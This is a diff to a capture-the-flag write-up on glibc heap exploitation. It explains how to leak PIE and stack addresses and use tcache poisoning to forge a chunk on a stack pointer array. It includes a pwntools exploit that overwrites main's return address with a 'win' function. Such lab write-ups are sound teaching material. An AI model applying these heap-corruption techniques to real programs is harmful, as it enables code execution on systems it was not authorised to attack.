@@ -748,8 +748,7 @@ def exploit():
 
 ## Challenge 14
 
-Now we have to obtain control flow over the program. There's a `win` function exists within the binary. We should retrieve a PIE program leak to resolve it, which can be done via the `echo` handler - which sets a PIE pointers into a chunk returned by `malloc(0x20)`. As long as we can read a pointer of a slot, we can easily obtain this value. 
-
+Now we have to obtain control flow over the program. There's a `win` function exists within the binary. We should retrieve a PIE program leak to resolve it, which can be done via the `echo` handler - which sets a PIE pointers into a chunk returned by `malloc(0x20)`. As long as we can read a pointer of a slot, we can easily obtain this value. \
 Moreover, we'd need a stack leakage - which can be obtained by performing House of Spirit - writing a fake chunk on the stack via `stack_scanf`, and injecting it into the tcachebin via `stack_free`. 
 
 Finally, we'd utilize arbitrary write primitive (by tcache poisioning) to overwrite `main_ra` into `win`. 
@@ -1058,6 +1057,57 @@ pwndbg> x/10gx 0x7f115b49e740-72
 ```
 
 This means that by leaking an `ld` address, we can forge a chunk within the linker memory area, overwriting the `tcache_perthread_struct` address itself. While this may work, this approach is wayyy too wacky, and too many stuff may break within allocations. 
+
+Another idea involving direct exploitation of the `ptr` flat array, instead of its `v6` variable. \
+We have the primitive of allocating a chunk at an arbitrary aligned address. In particular, we would be able to allocate it somewhere near the `ptr` flat buffer. However, in order to write into it, we have to pass the sanity check performed by `malloc_usable_size`, which fetches the chunk's `size` and compares `chunk + chunk_size` points to somewhere having `PREV_INUSE` set. While this seem non trivial to exploit, notice both `v6` and `v10` are controlled variables resides before the pointers array on the stack. While supplying invalid index for `v6` the program crashes, `v10` have no such limitation, and is fully controlled by the `size` supplied into `malloc`. Hence, by supplying an adequate `size` to malloc, and making sure the allocation would return right past `v10` (which is the exact address of `ptrs` array, as they're adjacent) - we should be able to forge a *writeable* chunk, right on the `ptrs` array! \
+Later on, I've noticed an interesting behavior. While the `ptrs` array is located within `[rbp - 0x160]`, `v10` is actually located within `[rbp - 0x15c]`, not `[rbp - 0x158]` as need. However, my exploit DID work. By deeply inspected, I've seen the size of the chunk is constant `0x83`, regardless of my written `v10` value. By some debugging, I've seen the following wierd asm line within `main`, right before beginning the challenge. It cannot be seen at IDA, and hat was probably injected by the challenge's author:
+
+```c
+mov [rbp - 0x158], 83h
+```
+
+(Personally I think the challenge would've been cooler without it, as it was cooler to fake the size of the chunk ourselves)
+
+```python
+def exploit():
+    p = process(BINARY)
+    pointers_array = get_leak_addr(p)
+    main_ra = pointers_array + 0x158
+    pie_base = get_leak_addr(p) - p.elf.symbols['main']
+    assert(pie_base & 0xfff == 0)
+    win_addr = pie_base + p.elf.symbols['win']
+    print(f'main_ra: {hex(main_ra)} pointers_array: {hex(pointers_array)} win_addr: {hex(win_addr)}')
+    p.recvuntil(b'quit): ')
+
+    chunk_size = 0x20  # Arbitrary size
+    malloc(p, 0, chunk_size)
+    malloc(p, 1, chunk_size)
+    free(p, 1)
+    free(p, 0)
+    mangled_next_ptr = puts(p, 0)
+    demangled_ptr, key = demangle_ptr(mangled_next_ptr)
+    print(f'demangled_ptr: {hex(demangled_ptr)} key: {hex(key)}')
+
+    # Allocate a chunk right on the pointers array, and store it at ptrs[0]
+    # Important - Notice the challenge commercially have some legitimate value for 'size', right before the pointers_array chunk. This is intended.
+    chunk_size_2 = chunk_size + 0x20 
+    new_allocate_chunk_at_addr_in_slot(p, pointers_array, 0, chunk_size_2, key)
+
+    # Overwrite ptrs[0] so now it would contain main_ra
+    buf = struct.pack('<Q', main_ra)
+    scanf(p, 0, buf)
+
+    # Overwrite main_ra so it would contain the win address :)
+    buf_2 = struct.pack('<Q', win_addr)
+    scanf(p, 0, buf_2)
+
+    p.sendline(b'quit')
+    p.interactive()
+```
+
+## Challenge 18
+
+Similar to challenge 13, but now there's safe linking. 
 
 
 
